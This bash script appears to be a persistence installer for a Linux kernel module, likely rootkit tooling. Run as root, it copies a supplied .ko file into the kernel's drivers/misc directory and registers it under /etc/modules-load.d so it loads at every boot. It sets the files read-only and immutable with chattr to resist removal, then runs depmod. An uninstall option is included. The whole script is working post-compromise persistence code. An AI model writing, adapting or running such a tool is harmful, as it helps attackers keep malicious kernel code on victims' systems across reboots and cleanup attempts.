#!/bin/bash

systemd_cfg_dir='/etc/modules-load.d'
systemd_svc_dir='/lib/systemd/system/'
systemd_mod_dir="/lib/modules/$(uname -r)/kernel/drivers/misc"

echolor()
{
	echo -e "\e[90m[\e[91m${1}\e[90m]\e[0m $2"
}

usage()
{
	echo "$(basename ${0%.sh}) [options] [module-file]"

	cat << EOF >&2
	-h           help
	-u           uninstall
	-m [method]  persistence method

	Methods
		systemd : create module entry under ${systemd_cfg_dir}
EOF

	[ -n "$2" ] && echo && echolor '!' "$2"

	exit ${1:-0}
}

check_systemd_module()
{
	[ -f "${systemd_mod_dir}/$(basename ${module%.ko}.ko)"   ] ||
	[ -f "${systemd_cfg_dir}/$(basename ${module%.ko}.conf)" ]
}

install_systemd_module()
{
	local mod_dst="${systemd_mod_dir}/$(basename ${module%.ko}.ko)"
	local cfg_dst="${systemd_cfg_dir}/$(basename ${module%.ko}.conf)"

	echolor '┬' 'Installing systemd module-based persistence'
	echolor '│' "Installing ${cfg_dst}"

	if ! echo "$(basename ${module%.ko})" > "$cfg_dst" 2> /dev/null; then
		echolor '─' 'Failed'
		return 1
	fi

	if ! chmod 400 "$cfg_dst" 2> /dev/null; then
		echolor '┬' 'Failed  to set it read-only'
	fi

	echolor '│' "Installing module at ${mod_dst}"

	if ! install -m 400 "${module}" "${mod_dst}" 2> /dev/null; then
		echolor '─' 'Failed'
		uninstall_systemd &> /dev/null

		return 2
	fi

	echolor '│' 'Setting the immutable bit on all files'

	if ! chattr +i "$cfg_dst" "$mod_dst" 2> /dev/null; then
		echolor '┬' 'Failed'
	fi

	echolor '│' 'Updating start-up module list'

	if ! depmod 2> /dev/null; then
		echolor '─' 'Failed'
		uninstall_systemd &> /dev/null

		return 3
	fi

	echolor '┴' 'Done'

	return 0
}

uninstall_systemd_module()
{
	local mod_dst="${systemd_mod_dir}/$(basename ${module%.ko}.ko)"
	local cfg_dst="${systemd_cfg_dir}/$(basename ${module%.ko}.conf)"

	echolor '┬' 'Uninstalling systemd module-based persistence'

	if [ -f "$cfg_dst" ]; then
		echolor '│' "Unsetting the immutable bit on ${cfg_dst}"

		if ! chattr -i "${cfg_dst}" 2> /dev/null; then
			echolor '─' 'Failed'
			return 1
		fi

		echolor '│' "Removing ${cfg_dst}"

		if ! rm -f "$cfg_dst" 2> /dev/null; then
			echolor '─' 'Failed'
			return 1
		fi
	fi

	if [ -f "$mod_dst" ]; then
		echolor '│' "Unsetting the immutable bit on ${mod_dst}"

		if ! chattr -i "${mod_dst}" 2> /dev/null; then
			echolor '─' 'Failed'
			return 1
		fi

		echolor '│' "Removing ${mod_dst}"

		if ! rm -f "$mod_dst" 2> /dev/null; then
			echolor '─' 'Failed'
			return 1
		fi
	fi

	echolor '│' 'Updating start-up module list'

	if ! depmod 2> /dev/null; then
		echolor '─' 'Failed'
		return 2
	fi

	echolor '┴' 'Done'

	return 0
}


[ ${#*} -eq 0 ] && usage 1
[ $EUID -eq 0 ] || usage 1 'Must be root'

while getopts ':hum:' o; do
	case $o in
		h) usage
		;;

		u) uninstall='y'
		;;

		m)
			if ! [[ "${method:=${OPTARG}}" =~ ^systemd$ ]]; then
				usage 1 "Invalid method: ${OPTARG}"
			fi
		;;

		?) usage 1 "Invalid option: '${OPTARG}'"
		;;
	esac
done

shift $((OPTIND - 1))

[ -z "$method"       ] && usage 1 'No method provided'
[ -z "${module:=$1}" ] && usage 1 'No module provided'

if [[ -z "$uninstall" && ! -f "$module" ]]; then
	usage 1 "No such module: ${module}"
fi

if [ "$method" = 'systemd' ]; then
	if [ -z "$uninstall" ]; then
	 	if check_systemd_module; then
			echolor '!' 'Already installed'
			exit 1
		fi

		install_systemd_module
	else
		if ! check_systemd_module; then
			echolor '!' 'Not installed'
			exit 1
		fi

		uninstall_systemd_module
	fi
fi
